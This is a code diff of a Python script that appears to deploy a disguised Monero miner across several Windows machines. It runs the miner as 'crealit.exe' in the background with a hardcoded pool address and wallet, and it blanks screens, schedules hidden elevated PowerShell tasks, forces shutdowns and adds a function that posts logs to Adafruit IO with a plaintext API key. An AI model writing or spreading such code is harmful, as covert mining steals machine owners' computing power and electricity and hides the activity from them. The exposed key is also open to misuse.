@@ -4,7 +4,7 @@ import datetime
 import urllib.request
 from pathlib import Path
 import subprocess, re, sys
-import requests
+# import requests
 
 DESLIGADO = 0
 LIGADO = 1
@@ -100,12 +100,12 @@ def restart_ethernet():
     time.sleep(10)
     subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-def verificar_acesso(url="https://monero.hashvault.pro/en/"):
-    try:
-        resposta = requests.get(url, timeout=5)
-        return resposta.status_code
-    except requests.exceptions.RequestException as e:
-        return f"Erro ao acessar o site: {e}"
+# def verificar_acesso(url="https://monero.hashvault.pro/en/"):
+#     try:
+#         resposta = requests.get(url, timeout=5)
+#         return resposta.status_code
+#     except requests.exceptions.RequestException as e:
+#         return f"Erro ao acessar o site: {e}"
 
 def enable_ics():
     try:
@@ -141,17 +141,8 @@ def enable_ics():
     except Exception:
         pass
 
-def disable_ics():
-    now = datetime.datetime.now()
-    shutdown_time = now.replace(hour=shutdown_hour, minute=shutdown_minute, second=0)
-    if shutdown_time < now:
-        shutdown_time += datetime.timedelta(days=1)
-    secs_left = int((shutdown_time - now).total_seconds())
+def disable_ics(agendamento=False):
 
-    # Criar script PS1 que desativa o ICS
-    destino.mkdir(exist_ok=True, parents=True)
-    bat_path = (destino / "desativar_ics.ps1").resolve()
-    
     variaveis = f"""
 $internet = "{wifi_interface}" 
 $local = "{ethernet_interface}"
@@ -172,27 +163,42 @@ foreach ($conn in $connections) {
 }
 """
     script = variaveis + comandos
-    bat_path.write_text(script, encoding="utf-8")
 
-    # Agendar execução 5 minutos antes do desligamento
-    trigger_time = (shutdown_time - datetime.timedelta(minutes=5)).strftime("%H:%M")
+    if not agendamento:
 
-    # Comando PowerShell para criar a tarefa
-    ps_cmd = rf'''
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{bat_path}"'
-$trigger = New-ScheduledTaskTrigger -Once -At "{trigger_time}"
-$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
-Register-ScheduledTask -TaskName 'DesativarICS' `
-                       -Action $action `
-                       -Trigger $trigger `
-                       -Settings $settings `
-                       -RunLevel Highest -Force
-'''
+        subprocess.run(["powershell", "-Command", script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    else:
 
+        now = datetime.datetime.now()
+        shutdown_time = now.replace(hour=shutdown_hour, minute=shutdown_minute, second=0)
+        if shutdown_time < now:
+            shutdown_time += datetime.timedelta(days=1)
+        secs_left = int((shutdown_time - now).total_seconds())
 
+        # Criar script PS1 que desativa o ICS
+        destino.mkdir(exist_ok=True, parents=True)
+        bat_path = (destino / "desativar_ics.ps1").resolve()
+
+        bat_path.write_text(script, encoding="utf-8")
+
+        # Agendar execução 5 minutos antes do desligamento
+        trigger_time = (shutdown_time - datetime.timedelta(minutes=5)).strftime("%H:%M")
+
+        # Comando PowerShell para criar a tarefa
+        ps_cmd = rf'''
+    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{bat_path}"'
+    $trigger = New-ScheduledTaskTrigger -Once -At "{trigger_time}"
+    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
+    Register-ScheduledTask -TaskName 'DesativarICS' `
+                        -Action $action `
+                        -Trigger $trigger `
+                        -Settings $settings `
+                        -RunLevel Highest -Force
+    '''
+
+        subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def schedule_shutdown():
     now = datetime.datetime.now()
@@ -251,7 +257,7 @@ def baixar_arquivos():
         except Exception:
             continue
 
-def desligar_monitor(tempo_em_segundos=300):
+def desligar_tela(tempo_em_segundos=300):
     try:
         # Comandos de configuração via reg add
         comandos_reg = [
@@ -281,10 +287,34 @@ def get_computer_description():
     except Exception:
         return "sem_descricao"
 
+def enviar_log(valor):
+
+    # URL do feed
+    url = "https://io.adafruit.com/api/v2/alexstocco_senai/feeds/teste/data"
+
+    # Sua chave de API Adafruit IO
+    headers = {
+        "X-AIO-Key": "aio_mbYj12mp4HCb9zGNHMnIRDw7IkL9",
+        "Content-Type": "application/json"
+    }
+
+    # Dados a serem enviados
+    payload = {
+        "value": valor  # substitua pelo valor que deseja enviar
+    }
+
+    # Envia o dado via POST
+    response = requests.post(url, json=payload, headers=headers)
+
+    # Verifica o resultado
+    if response.status_code == 200:
+        print("Dado enviado com sucesso!")
+    else:
+        print("Erro ao enviar dado:", response.status_code, response.text)
+
 
 def ligar_crealit():
     subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 --background', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
 
 def matar_processo(nome_processo="crealit.exe"):
     """
@@ -301,8 +331,48 @@ def matar_processo(nome_processo="crealit.exe"):
     except Exception as e:
         print(f"Erro ao tentar matar o processo {nome_processo}: {e}")
 
+def monitoramento():
+    acesso = verificar_acesso()
+    if acesso == 200: return
+    matar_processo()
 
+# def reconectar_wifi():
+#     intervalo = 30
+
+#     if verificar_acesso == 200: return
+
+#     #Tentando renew
+#     subprocess.run(
+#         f'ipconfig /release "{wifi_interface}"',
+#         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+#         )
+#     time.sleep(intervalo)
+
+#     subprocess.run(
+#         f'ipconfig /renew "{wifi_interface}"',
+#         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+#         )    
+#     time.sleep(intervalo)
+
+#     if verificar_acesso == 200: return
+
+#     # Tentando desconectar e reconectar
+#     subprocess.run(
+#         f'netsh wlan disconnect interface="{wifi_interface}"',
+#         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+#         )
+#     time.sleep(intervalo)
     
+#     subprocess.run(
+#         f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
+#         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+#         )
+#     time.sleep(intervalo)
+
+#     if verificar_acesso == 200: return
+
+    #Tentando conectar ao IQ
+
 
 
 def main_master():
@@ -311,7 +381,7 @@ def main_master():
             exit()
     matar_processo()
     baixar_arquivos()
-    desligar_monitor()  
+    desligar_tela()  
     schedule_shutdown()  
     connect_to_wifi()
     time.sleep(10)
@@ -319,9 +389,9 @@ def main_master():
     time.sleep(10)
     restart_ethernet()
     ligar_crealit()
-    disable_ics()
+    disable_ics(agendamento=True)
     desativar_cancelamento_shutdown_domingo()
-    desligar_monitor()  
+    desligar_tela()  
 
 def main_slave():
     if EXECUCAO != TESTE:
@@ -329,13 +399,13 @@ def main_slave():
             exit()
     matar_processo()
     baixar_arquivos()
-    desligar_monitor() 
+    desligar_tela()
     configurar_ip(usar_powershell=False)
     time.sleep(10)
     schedule_shutdown()
     ligar_crealit()
     desativar_cancelamento_shutdown_domingo()
-    desligar_monitor()  
+    desligar_tela()
 
 
 if __name__ == "__main__":
